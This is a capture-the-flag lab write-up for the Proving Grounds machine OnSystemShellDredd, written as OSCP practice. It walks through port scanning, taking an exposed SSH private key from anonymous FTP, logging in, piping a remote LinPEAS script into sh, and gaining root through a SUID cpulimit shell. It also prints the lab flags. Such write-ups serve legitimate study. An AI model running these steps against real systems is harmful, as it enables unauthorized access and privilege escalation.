# OnSystemShellDredd (rough notes)

Initial service enumeration: 

```
┌──(scr1pt3r㉿pwnbox)-[~/go/src/github.com/adrianosela/road-to-oscp/write-ups/proving-grounds/linux/play/easy/2024-03-31-OnSystemShellDredd]
└─$ nmap -v -p- -T4 -Pn ossd
...

PORT      STATE SERVICE
21/tcp    open  ftp
61000/tcp open  unknown
```

Now with service version fingerprinting:

```
┌──(scr1pt3r㉿pwnbox)-[~/go/src/github.com/adrianosela/road-to-oscp/write-ups/proving-grounds/linux/play/easy/2024-03-31-OnSystemShellDredd]
└─$ nmap -v -p 21,61000 -A ossd
...

PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.3
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.45.201
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
61000/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 59:2d:21:0c:2f:af:9d:5a:7b:3e:a4:27:aa:37:89:08 (RSA)
|   256 59:26:da:44:3b:97:d2:30:b1:9b:9b:02:74:8b:87:58 (ECDSA)
|_  256 8e:ad:10:4f:e3:3e:65:28:40:cb:5b:bf:1d:24:7f:17 (ED25519)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

Looks like we have:
- an FTP server that allows anonymous access on port 21; the server is vsFTPd version 3.0.3
- an SSH server on port 61000

Logging into the FTP server with anonymous access:

```
┌──(scr1pt3r㉿pwnbox)-[~/go/src/github.com/adrianosela/road-to-oscp/write-ups/proving-grounds/linux/play/easy/2024-03-31-OnSystemShellDredd]
└─$ ftp ossd 
Connected to ossd.
220 (vsFTPd 3.0.3)
Name (ossd:scr1pt3r): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
```

Digging for files we find a hidden directory `.hannah`:

```
ftp> ls
229 Entering Extended Passive Mode (|||56602|)
150 Here comes the directory listing.
226 Directory send OK.
ftp> ls -la
229 Entering Extended Passive Mode (|||12021|)
150 Here comes the directory listing.
drwxr-xr-x    3 0        115          4096 Aug 06  2020 .
drwxr-xr-x    3 0        115          4096 Aug 06  2020 ..
drwxr-xr-x    2 0        0            4096 Aug 06  2020 .hannah
226 Directory send OK.
```

The directory contains an RSA private key:

```
ftp> cd .hannah
250 Directory successfully changed.
ftp> ls -la
229 Entering Extended Passive Mode (|||59162|)
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 Aug 06  2020 .
drwxr-xr-x    3 0        115          4096 Aug 06  2020 ..
-rwxr-xr-x    1 0        0            1823 Aug 06  2020 id_rsa
226 Directory send OK.
```

Downloading it to my local machine:

```
ftp> get id_rsa
local: id_rsa remote: id_rsa
229 Entering Extended Passive Mode (|||49191|)
150 Opening BINARY mode data connection for id_rsa (1823 bytes).
100% |*************************************************************************|  1823        1.45 MiB/s    00:00 ETA
226 Transfer complete.
1823 bytes received in 00:00 (25.34 KiB/s)
```

On our local machine, we need to fix the file permissions for the private key, or SSH will not allow us to use it:

```
┌──(scr1pt3r㉿pwnbox)-[~/go/src/github.com/adrianosela/road-to-oscp/write-ups/proving-grounds/linux/play/easy/2024-03-31-OnSystemShellDredd]
└─$ chmod 600 id_rsa 
```

Using the key to SSH into the remote host as user `hannah`:

```
┌──(scr1pt3r㉿pwnbox)-[~/go/src/github.com/adrianosela/road-to-oscp/write-ups/proving-grounds/linux/play/easy/2024-03-31-OnSystemShellDredd]
└─$ ssh -i id_rsa hannah@ossd -p 61000
Linux ShellDredd 4.19.0-10-amd64 #1 SMP Debian 4.19.132-1 (2020-07-24) x86_64
The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
hannah@ShellDredd:~$ 
```

We land in `hannah`'s home directory, where we find our access flag:

```
hannah@ShellDredd:~$ cat local.txt
979f105eb7f13b98dd46a30654f018da
```

Time for... LinPEAS!

```
hannah@ShellDredd:/etc$ wget -O- https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
--2024-04-01 03:54:38--  https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
...
```

The most relevant findings are:

- A highly probably kernel exploit

```
╔══════════╣ Executing Linux Exploit Suggester
╚ https://github.com/mzet-/linux-exploit-suggester
[+] [CVE-2019-13272] PTRACE_TRACEME

   Details: https://bugs.chromium.org/p/project-zero/issues/detail?id=1903
   Exposure: highly probable
   Tags: ubuntu=16.04{kernel:4.15.0-*},ubuntu=18.04{kernel:4.15.0-*},debian=9{kernel:4.9.0-*},[ debian=10{kernel:4.19.0-*} ],fedora=30{kernel:5.0.9-*}
   Download URL: https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/47133.zip
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2019-13272/poc.c
   Comments: Requires an active PolKit agent.
```

- `mawk` and `cpulimit` binaries have SUID

```
╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid
...
-rwsr-sr-x 1 root root 120K Mar 23  2012 /usr/bin/mawk
...
-rwsr-sr-x 1 root root 23K Jun 23  2017 /usr/bin/cpulimit
```

Using [GTFOBins](https://gtfobins.github.io/) as a reference, tried the privilege escalation vectors with mawk and got nowhere

```
hannah@ShellDredd:/$ mawk 'BEGIN {system("cat /root/proof.txt")}'
cat: /root/proof.txt: Permission denied
```

However, `cpulimit` worked:

```
hannah@ShellDredd:/$ cpulimit -l 100 -f -- /bin/sh -p
Process 20996 detected
# whoami
root
```

We quicky find our proof in the root directory:

```
# cd /root
# cat proof.txt
fa93b6e606b0a377d023f3a80675ffa2
```